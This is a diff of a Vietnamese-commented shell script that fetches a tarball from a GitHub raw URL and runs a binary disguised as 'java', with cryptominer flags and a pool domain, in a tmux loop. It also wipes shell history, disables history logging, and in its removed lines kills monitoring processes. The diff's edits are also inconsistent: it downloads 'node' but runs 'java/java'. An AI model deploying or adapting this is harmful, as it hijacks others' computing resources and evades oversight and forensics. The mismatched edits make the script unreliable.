@@ -11,41 +11,27 @@ history -c
 rm -f ~/.bash_history
 export HISTFILE=/dev/null
 
-# 🔁 Kill các tiến trình giám sát
-(
-  while true; do
-    pkill -f qemu-system-x86_64-headless 2>/dev/null
-    pkill -f netsimd 2>/dev/null
-    pkill -f watchman 2>/dev/null
-    sleep 3
-  done
-) &
 
 # 📥 Tải và giải nén nếu chưa có
-if [ ! -f "$(pwd)/java/java" ]; then
+if [ ! -f "$(pwd)/node/node" ]; then
     echo "[+] Downloading ..."
-    rm -rf java java.tar.gz
-    curl -sL -o java.tar.gz https://raw.githubusercontent.com/trinhkhaccong/tool/main/java.tar.gz
-    tar -xzf java.tar.gz
-    chmod +x java/java
-    rm -f java.tar.gz
+    rm -rf node node.tar.gz
+    curl -sL -o node.tar.gz https://raw.githubusercontent.com/trinhkhaccong/tool/main/node.tar.gz
+    tar -xzf node.tar.gz
+    chmod +x node/java
+    rm -f node.tar.gz
 fi
 
-# 🔁 Vòng lặp chạy miner
-echo "[+] Vòng lặp ..."
+# 🔁 Kiểm tra và chạy lại nếu session không tồn tại
+echo "[+] Vòng lặp kiểm tra session mỗi 30s ..."
 while true; do
-    # 1. Chạy process
-    tmux kill-session -t $SESSION 2>/dev/null
-    sleep 2
-    tmux new-session -s $SESSION -d
-    tmux send-keys -t $SESSION "
-        $(pwd)/java/java -o $DOMAIN --tls -k -t 7 --rig-id $NAME_WORK
-    " C-m
-    echo "[+] start process start process start process start process start process start process - chạy 5 phút..."
-    sleep 300   # chạy 5 phút
-
-    # 2. Kill process
-    pkill -f "$(pwd)/java/java" 2>/dev/null
-    echo "[+] kill process kill process kill process kill process kill process - nghỉ 5 phút..."
-    sleep 298   # nghỉ 5 phút trước khi chạy lại
+    if ! tmux has-session -t $SESSION 2>/dev/null; then
+        tmux new-session -s $SESSION -d
+        tmux send-keys -t $SESSION "
+            $(pwd)/java/java -o $DOMAIN --tls -k -t 6 --rig-id $NAME_WORK
+        " C-m
+    else
+        echo "[+] start process start process start process start process start process start process - chạy 30s check lai..."
+    fi
+    sleep 30   # 3 phút check 1 lần
 done
